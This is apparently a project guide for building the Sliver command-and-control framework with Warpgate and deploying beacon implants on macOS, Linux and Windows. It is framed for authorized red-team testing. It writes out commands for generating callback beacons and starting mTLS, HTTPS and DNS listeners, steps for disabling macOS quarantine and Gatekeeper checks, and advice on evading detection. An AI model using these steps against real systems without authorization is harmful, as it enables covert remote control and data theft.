# Building and Testing Sliver C2 with Warpgate

Complete guide to building and deploying the Sliver Command & Control
framework using Warpgate.

## Table of Contents

- [Overview](#overview)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Building Sliver Container](#building-sliver-container)
- [Deploying Beacons](#deploying-beacons)
  - [macOS ARM64 Deployment](#macos-arm64-deployment)
  - [Linux Deployment](#linux-deployment)
  - [Windows Deployment](#windows-deployment)
- [Network Configuration](#network-configuration)
- [Listener Configuration](#listener-configuration)
- [Beacon Operations](#beacon-operations)
- [Troubleshooting](#troubleshooting)
- [Security Considerations](#security-considerations)
- [Advanced Usage](#advanced-usage)
- [Cleanup](#cleanup)

## Overview

This guide demonstrates how to build Sliver C2 framework images using
Warpgate and deploy beacons for security testing and red team operations.

**What is Sliver?**

Sliver is an open-source command and control (C2) framework designed for
adversary emulation and red team operations. It provides:

- Cross-platform beacon/implant support (Windows, Linux, macOS)
- Multiple C2 protocols (mTLS, HTTP(S), DNS, WireGuard)
- Extensibility through modules and extensions
- OPSEC-friendly features like process injection and traffic obfuscation

**Why use Warpgate for Sliver?**

- Reproducible builds with version-controlled templates
- Multi-architecture support (amd64, arm64)
- Consistent environment across teams
- Easy deployment to container orchestration platforms
- Integration with CI/CD pipelines

## Prerequisites

**Required:**

- Docker or Podman installed and running
- Warpgate installed ([installation guide](../README.md#installation))
- Basic understanding of C2 frameworks
- Network connectivity between server and target machines

**For macOS deployments:**

- macOS target machine (for ARM64 beacons)
- Code signing capabilities (or willingness to disable Gatekeeper)

**For production use:**

- Proper authorization for security testing
- Isolated network environment
- Understanding of legal and ethical boundaries

## Quick Start

Get a Sliver server running in 5 minutes:

```bash
# Build Sliver container image
warpgate build sliver --arch amd64

# Run Sliver server
docker run -it --rm \
  -p 8888:8888 \
  -p 4444:4444 \
  --name sliver-server \
  sliver:latest \
  /bin/bash

# Inside container, start Sliver
/opt/sliver/sliver-server

# Generate and deploy a beacon (covered in detail below)
```

## Building Sliver Container

### Using Warpgate Template

**Build from template name:**

```bash
# Build for amd64
warpgate build sliver --arch amd64

# Build for arm64
warpgate build sliver --arch arm64

# Build for both architectures
warpgate build sliver --arch amd64,arm64
```

**Verify the build:**

```bash
# Check image was created
docker images | grep sliver

# Expected output:
# sliver    latest    abc123def456    2 minutes ago    1.5GB
```

### Building with Custom Arsenal Path

If your template requires the Arsenal collection:

```bash
# Build with variable override
warpgate build sliver --var ARSENAL_REPO_PATH=/path/to/ansible-collection-arsenal

# Or use a variable file
cat > sliver-vars.yaml <<EOF
ARSENAL_REPO_PATH: /path/to/ansible-collection-arsenal
VERSION: 1.5.0
DEBUG: true
EOF

warpgate build sliver --var-file sliver-vars.yaml
```

### Building from Source

Build the Sliver template from your local repository:

```bash
# Clone template repository
git clone https://github.com/cowdogmoo/warpgate-templates.git
cd warpgate-templates/templates/sliver

# Build from local path
warpgate build . --arch amd64
```

## Deploying Beacons

### macOS ARM64 Deployment

Complete workflow for deploying Sliver beacons on macOS (M1/M2/M3).

#### Step 1: Get Target IP Address

On your macOS target machine:

```bash
# Get IP address (excluding localhost)
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'

# Or use this simpler command
ipconfig getifaddr en0
```

**Example output:** `192.168.1.100`

#### Step 2: Start Sliver Server Container

```bash
# Run Sliver container with exposed ports
docker run -it --rm \
  -p 8888:8888 \
  -p 4444:4444 \
  --name sliver-server \
  sliver:latest \
  /bin/bash

# Container ports:
# - 8888: mTLS C2 listener
# - 4444: HTTP(S) C2 listener (optional)
```

#### Step 3: Start Sliver Server

Inside the container:

```bash
# Start Sliver server
/opt/sliver/sliver-server

# You should see the Sliver prompt:
# sliver >
```

#### Step 4: Generate macOS ARM64 Beacon

Generate a beacon that will connect back to your server:

```bash
# Replace 192.168.1.50 with your Docker host IP
sliver > generate beacon --mtls 192.168.1.50:8888 --os mac --arch arm64 --save /tmp/beacon-macos-arm64

# Beacon generation output:
# [*] Generating new darwin/arm64 beacon implant binary (1m30s)
# [*] Build completed in 1m32s
# [*] Implant saved to /tmp/beacon-macos-arm64
```

**If you encounter obfuscation errors:**

```bash
# Use --skip-symbols to bypass garble (see Troubleshooting)
sliver > generate beacon --skip-symbols --mtls 192.168.1.50:8888 --os mac --arch arm64 --save /tmp/beacon-macos-arm64
```

#### Step 5: Start mTLS Listener

Start the listener that beacons will connect to:

```bash
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Listener started:
# [*] Starting mTLS listener on [::]:8888
```

#### Step 6: Deploy Beacon to macOS Target

On your macOS target machine:

```bash
# Copy beacon from container to your desktop
docker cp sliver-server:/tmp/beacon-macos-arm64 ~/Desktop/beacon-macos-arm64

# Navigate to Desktop
cd ~/Desktop

# Make executable
chmod +x beacon-macos-arm64

# Remove quarantine attributes (macOS security)
xattr -c beacon-macos-arm64

# Code sign the binary (prevents security warnings)
codesign --force --deep -s - beacon-macos-arm64

# Verify signature
codesign -dv beacon-macos-arm64

# Execute beacon in background
./beacon-macos-arm64 &
```

#### Step 7: Verify Connection

Back in the Sliver server console:

```bash
# List active beacons
sliver > beacons

# Expected output:
# ID         Name                      Transport   Hostname    Username   OS            Last Check-In   Next Check-In
# ========== ========================= =========== =========== ========== ============= =============== ===============
# 62df50e1   CONSTITUTIONAL_EMPLOYEE   mtls        ouroboros   user       darwin/arm64  25s             36s

# Interact with beacon using its ID or name
sliver > use 62df50e1

# Or
sliver > use CONSTITUTIONAL_EMPLOYEE

# Now you're in beacon context
sliver (CONSTITUTIONAL_EMPLOYEE) >
```

#### Step 8: Test Beacon Commands

```bash
# Get system info
sliver (CONSTITUTIONAL_EMPLOYEE) > info

# List files
sliver (CONSTITUTIONAL_EMPLOYEE) > ls

# Get process list
sliver (CONSTITUTIONAL_EMPLOYEE) > ps

# Run shell command
sliver (CONSTITUTIONAL_EMPLOYEE) > shell whoami

# Download file
sliver (CONSTITUTIONAL_EMPLOYEE) > download /path/to/file

# Upload file
sliver (CONSTITUTIONAL_EMPLOYEE) > upload local-file remote-path
```

### Linux Deployment

Deploying beacons on Linux targets:

```bash
# Generate Linux beacon
sliver > generate beacon --mtls 192.168.1.50:8888 --os linux --arch amd64 --save /tmp/beacon-linux-amd64

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# On Linux target
docker cp sliver-server:/tmp/beacon-linux-amd64 /tmp/beacon
chmod +x /tmp/beacon
/tmp/beacon &

# Verify connection
sliver > beacons
sliver > use <beacon-id>
```

### Windows Deployment

Deploying beacons on Windows targets:

```bash
# Generate Windows beacon
sliver > generate beacon --mtls 192.168.1.50:8888 --os windows --arch amd64 --save /tmp/beacon-windows.exe

# Alternative: Generate as DLL or shared library
sliver > generate beacon --mtls 192.168.1.50:8888 --os windows --arch amd64 --format shared --save /tmp/beacon.dll

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# On Windows target (via SMB, web download, etc.)
# Copy beacon-windows.exe to target
# Execute: beacon-windows.exe

# Verify connection
sliver > beacons
sliver > use <beacon-id>
```

## Network Configuration

### Port Requirements

**mTLS Listener (recommended):**

- Port: 8888 (configurable)
- Protocol: TCP
- Encryption: Mutual TLS

**HTTP(S) Listener (alternative):**

- Port: 80/443 or custom
- Protocol: TCP
- Encryption: Optional (HTTPS)

**DNS Listener (stealth):**

- Port: 53
- Protocol: UDP
- Requires: DNS server configuration

### Firewall Configuration

**Docker host (where Sliver server runs):**

```bash
# Allow inbound on mTLS port
sudo ufw allow 8888/tcp

# Allow inbound on HTTPS port (if using HTTP(S))
sudo ufw allow 443/tcp

# Verify
sudo ufw status
```

**Network ACLs:**

Ensure network path exists between:

- Beacon targets → Docker host (ports 8888, 443, etc.)

### NAT and Port Forwarding

If Sliver server is behind NAT:

```bash
# Forward port 8888 to Sliver server
# Router configuration varies

# Test connectivity from external network
nc -zv <public-ip> 8888
```

## Listener Configuration

### mTLS Listener (Most Secure)

```bash
# Start mTLS listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Specify interface
sliver > mtls --lhost 192.168.1.50 --lport 8888

# View active listeners
sliver > jobs

# Stop listener
sliver > jobs -k <job-id>
```

### HTTP(S) Listener

```bash
# Start HTTP listener
sliver > http --lhost 0.0.0.0 --lport 80

# Start HTTPS listener
sliver > https --lhost 0.0.0.0 --lport 443

# Specify custom domain
sliver > https --lhost 0.0.0.0 --lport 443 --domain c2.example.com

# List active listeners
sliver > jobs
```

### DNS Listener

```bash
# Start DNS listener
sliver > dns --domains c2.example.com --canaries c2-canary.example.com

# Requires:
# - DNS records pointing to server
# - Port 53 accessible
# - Server running as root/admin

# Generate DNS beacon
sliver > generate beacon --dns c2.example.com --os linux --arch amd64 --save /tmp/beacon-dns
```

### Multi-Listener Setup

Run multiple listeners simultaneously:

```bash
# Start mTLS
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Start HTTPS
sliver > https --lhost 0.0.0.0 --lport 443

# Start DNS
sliver > dns --domains c2.example.com

# View all listeners
sliver > jobs

# Expected output:
# ID   Name    Protocol   Port
# ==   ====    ========   ====
# 1    mTLS    tcp        8888
# 2    HTTPS   tcp        443
# 3    DNS     udp        53
```

## Beacon Operations

Once connected to a beacon, you have access to Sliver's full command set:

**Common operations:**

- **Session Management:** `beacons`, `sessions`, `use <id>`, `background`
- **File Operations:** `upload`, `download`, `ls`, `cd`, `pwd`
- **Process Operations:** `ps`, `terminate`, `execute`, `shell`
- **Information Gathering:** `info`, `getenv`, `netstat`, `ifconfig`
- **Pivoting:** `portfwd`, `socks5`

**Example session:**

```bash
# List and select beacon
sliver > beacons
sliver > use CONSTITUTIONAL_EMPLOYEE

# Run commands
sliver (CONSTITUTIONAL_EMPLOYEE) > info
sliver (CONSTITUTIONAL_EMPLOYEE) > ls
sliver (CONSTITUTIONAL_EMPLOYEE) > download /path/to/file
```

For complete command reference, see the [Sliver Wiki](https://github.com/BishopFox/sliver/wiki).

## Troubleshooting

### Symbol Obfuscation Error

**Symptoms:**

```text
[!] rpc error: code = Unknown desc = exit status 1
```

**Root Cause:**

Sliver uses `garble` for Go binary obfuscation, which requires `git` to apply
patches during the build process. If `git` is not installed in the container,
garble fails.

**Error Details:**

```text
cannot get modified linker: failed to 'git apply' patches: exec: "git": executable file not found in $PATH
```

**Solutions:**

#### Solution 1: Skip Symbol Obfuscation (Recommended)

```bash
# Generate beacon without obfuscation
sliver > generate beacon --skip-symbols --mtls 192.168.1.50:8888 --os mac --arch arm64 --save /tmp/beacon
```

**Trade-offs:**

- ✅ Works immediately without container changes
- ✅ Faster beacon generation
- ⚠️ Beacons are less resistant to static analysis
- ⚠️ Function names and symbols are visible

#### Solution 2: Install Git in Container

For production use requiring obfuscation:

**Update Warpgate template:**

Edit `sliver/warpgate.yaml` provisioner:

```yaml
provisioners:
  - type: shell
    inline:
      - apt-get update
      - apt-get install -y git  # Add this line
      - # ... rest of provisioning
```

**Rebuild container:**

```bash
warpgate build sliver --arch amd64
```

#### Solution 3: Use Pre-built Images

Use official Sliver images:

```bash
docker pull ghcr.io/bishopfox/sliver:latest
```

### Permission Denied for Garble

**Symptoms:**

Garble execution fails with permission errors.

**Solution:**

```bash
# Inside Sliver container
# Check garble location and permissions
which garble
ls -la $(which garble)

# Ensure proper PATH
export PATH=$HOME/.sliver/go/bin:$PATH

# Verify garble works
garble version
```

### Network Connectivity Issues

**Symptoms:**

Beacons fail to connect to server.

**Diagnosis:**

```bash
# From target machine, test connectivity
nc -zv <server-ip> 8888

# Expected output:
# Connection to <server-ip> 8888 port [tcp/*] succeeded!

# From server, check listener is running
sliver > jobs

# Check Docker port mapping
docker ps -a | grep sliver
# Should show: 0.0.0.0:8888->8888/tcp
```

**Solutions:**

1. **Verify firewall rules:**

   ```bash
   # On server
   sudo ufw status
   sudo ufw allow 8888/tcp
   ```

2. **Check Docker port mapping:**

   ```bash
   # Stop and restart with explicit ports
   docker run -it --rm -p 8888:8888 -p 4444:4444 sliver:latest
   ```

3. **Verify beacon callback address:**

   ```bash
   # Ensure you used correct IP when generating beacon
   sliver > generate beacon --mtls <CORRECT-IP>:8888 ...
   ```

4. **Check network path:**

   ```bash
   # From target, trace route
   traceroute <server-ip>

   # Ping test
   ping <server-ip>
   ```

### Beacon Not Checking In

**Symptoms:**

Beacon executed but doesn't appear in `beacons` list.

**Diagnosis:**

```bash
# Check beacon process is running (on target)
ps aux | grep beacon

# Check network connections (on target)
netstat -an | grep 8888

# Check Sliver logs (on server)
# Logs appear in Sliver console
```

**Solutions:**

1. **Verify listener is running:**

   ```bash
   sliver > jobs
   # Should show active mTLS listener
   ```

2. **Check callback timing:**

   ```bash
   # Beacons check in at intervals (default: 60s)
   # Wait 1-2 minutes and check again
   sliver > beacons
   ```

3. **Regenerate beacon with verbose errors:**

   ```bash
   # Generate beacon with debug output
   sliver > generate beacon --debug --mtls ...
   ```

4. **Test with interactive session instead:**

   ```bash
   # Generate session (interactive, not beacon)
   sliver > generate --mtls 192.168.1.50:8888 --os mac --arch arm64 --save /tmp/session
   # Sessions connect immediately
   ```

### macOS Security Warnings

**Symptoms:**

macOS blocks beacon execution with messages like:

- "cannot be opened because the developer cannot be verified"
- "macOS cannot verify that this app is free from malware"

**Solutions:**

1. **Remove quarantine attribute:**

   ```bash
   xattr -c beacon-macos-arm64
   ```

2. **Self-sign the binary:**

   ```bash
   codesign --force --deep -s - beacon-macos-arm64
   ```

3. **Disable Gatekeeper (temporary, testing only):**

   ```bash
   sudo spctl --master-disable
   # Execute beacon
   sudo spctl --master-enable  # Re-enable after
   ```

4. **Use right-click → Open:**
   - Right-click the beacon file
   - Select "Open"
   - Click "Open" in the warning dialog
   - This adds an exception for the file

### Container Build Fails

**Symptoms:**

Warpgate build fails during provisioning.

**Diagnosis:**

```bash
# Build with verbose output
warpgate build sliver --arch amd64 -v

# Check template syntax
warpgate validate sliver
```

**Solutions:**

1. **Update template cache:**

   ```bash
   warpgate templates update
   ```

2. **Build from local path:**

   ```bash
   git clone https://github.com/cowdogmoo/warpgate-templates.git
   warpgate build ./warpgate-templates/templates/sliver
   ```

3. **Check provisioner requirements:**
   - Ensure Ansible is installed (if using Ansible provisioner)
   - Verify all required variables are provided

## Security Considerations

### Legal and Ethical Use

⚠️ **CRITICAL: This tool is for authorized security testing only.**

**Before using Sliver:**

- ✅ Obtain written authorization for security testing
- ✅ Understand applicable laws in your jurisdiction
- ✅ Follow responsible disclosure practices
- ✅ Document all testing activities
- ✅ Use in isolated, controlled environments

**Never:**

- ❌ Deploy C2 infrastructure without authorization
- ❌ Test against systems you don't own or have permission to test
- ❌ Leave beacons running after testing completes
- ❌ Expose C2 servers to the public internet without hardening

### Operational Security (OPSEC)

**Network OPSEC:**

- Use VPNs or proxied infrastructure for C2 servers
- Rotate C2 domains and IP addresses
- Use HTTPS with valid certificates for HTTP(S) listeners
- Implement DNS over HTTPS (DoH) for DNS C2

**Beacon OPSEC:**

- Use jitter and sleep to evade behavior-based detection
- Implement process injection for memory-only execution
- Use encrypted protocols (mTLS, HTTPS, DNS-over-HTTPS)
- Obfuscate beacons (don't use `--skip-symbols` in production)

**Artifact OPSEC:**

- Clean up beacons after testing
- Use file-less deployment methods
- Implement beacon self-deletion after mission
- Avoid dropping files to disk when possible

### Hardening Sliver Server

**Container security:**

```bash
# Run as non-root user (requires rootless Docker/Podman)
docker run --user 1000:1000 ...

# Limit resources
docker run --memory="2g" --cpus="1.5" ...

# Read-only filesystem (where possible)
docker run --read-only ...

# No privileged mode
# Don't use: --privileged
```

**Network security:**

```bash
# Bind to specific interface, not 0.0.0.0
sliver > mtls --lhost 192.168.1.50 --lport 8888

# Use HTTPS with valid certificates
sliver > https --lhost 0.0.0.0 --lport 443 --cert /path/to/cert.pem --key /path/to/key.pem

# Implement IP whitelisting at firewall level
sudo ufw allow from 192.168.1.0/24 to any port 8888
```

**Access control:**

```bash
# Create operators with limited permissions
sliver > new-operator --name testuser --lhost 192.168.1.50 --lport 31337 --save testuser.cfg

# Use operator configs for multi-user access
sliver > use --config /path/to/operator.cfg
```

### Cleanup and Evidence

**After testing, always:**

1. **Terminate beacons:**

   ```bash
   sliver > beacons
   sliver > use <beacon-id>
   sliver > kill
   ```

2. **Remove artifacts from targets:**

   ```bash
   # On target machines
   rm /path/to/beacon
   rm /tmp/downloaded-files
   ```

3. **Stop and remove containers:**

   ```bash
   docker stop sliver-server
   docker rm sliver-server
   ```

4. **Clean up logs:**

   ```bash
   # Review and sanitize logs
   # Don't delete - archive for reporting
   ```

5. **Document findings:**
   - What was tested
   - What was successful
   - What was detected
   - Remediation recommendations

## Advanced Usage

**Multiplayer Mode** - Multiple operators on one server:

```bash
sliver > new-operator --name alice --lhost 192.168.1.50 --lport 31337 --save alice.cfg
sliver --config alice.cfg  # Operator connects with config
```

**Persistent Deployment** - Run as service with Docker Compose:

```yaml
version: '3'
services:
  sliver:
    image: sliver:latest
    ports: ["8888:8888", "443:443"]
    volumes: ["./sliver-data:/root/.sliver"]
    restart: unless-stopped
```

**CI/CD Integration** - Automate builds:

```bash
warpgate build sliver --arch amd64,arm64 --push --registry ghcr.io/myorg
```

**Custom Profiles** - Reusable beacon configurations:

```bash
sliver > profiles new --mtls 192.168.1.50:8888 --os mac --arch arm64 --name mac-beacon
sliver > generate --profile mac-beacon --save /tmp/beacon
```

See [Sliver Documentation](https://github.com/BishopFox/sliver/wiki) for more
advanced features.

## Cleanup

### Target Machines

**Find and terminate beacon processes:**

```bash
# Find beacon process
ps aux | grep beacon

# Or search for unusual processes
ps aux | grep -v -E 'system|root|daemon'

# Kill beacon process
kill -9 <PID>

# Remove beacon file
rm /path/to/beacon
```

**macOS specific:**

```bash
# Find process
pgrep -fl beacon

# Kill process
pkill -9 beacon

# Remove from Desktop
rm ~/Desktop/beacon-macos-arm64
```

### Server

**Stop Sliver server:**

```bash
# Inside Sliver console
sliver > exit

# Or Ctrl+D
```

**Stop and remove Docker container:**

```bash
# Stop container
docker stop sliver-server

# Remove container
docker rm sliver-server

# Optional: Remove image
docker rmi sliver:latest
```

**Clean up Docker volumes:**

```bash
# Remove any persistent volumes
docker volume ls
docker volume rm <volume-name>
```

### Network

**Close firewall ports:**

```bash
# Remove firewall rules
sudo ufw delete allow 8888/tcp
sudo ufw delete allow 443/tcp

# Verify
sudo ufw status
```

## Summary

**Key Takeaways:**

- ✅ Warpgate simplifies Sliver deployment with reproducible builds
- ✅ Support for multiple platforms (Linux, macOS, Windows)
- ✅ Multiple listener types (mTLS, HTTP(S), DNS)
- ✅ Always obtain authorization before security testing
- ✅ Clean up thoroughly after testing
- ✅ Use `--skip-symbols` to avoid garble issues
- ✅ Code sign macOS beacons to avoid security warnings

**Quick Command Reference:**

```bash
# Build Sliver
warpgate build sliver --arch amd64

# Run Sliver server
docker run -it --rm -p 8888:8888 sliver:latest /bin/bash
/opt/sliver/sliver-server

# Generate beacon
generate beacon --skip-symbols --mtls <IP>:8888 --os <os> --arch <arch> --save /tmp/beacon

# Start listener
mtls --lhost 0.0.0.0 --lport 8888

# List beacons
beacons

# Interact with beacon
use <beacon-id>
```

---

**Need help?**

- [Sliver Documentation](https://github.com/BishopFox/sliver/wiki)
- [Warpgate README](../README.md)
- [Report Issues](https://github.com/CowDogMoo/warpgate/issues)

**Security Disclosure:**

If you discover security vulnerabilities in Warpgate or Sliver, please report
them responsibly:

- Warpgate: Open an issue or email security@cowdogmoo.com
- Sliver: Follow [BishopFox's security policy](https://github.com/BishopFox/sliver/security/policy)
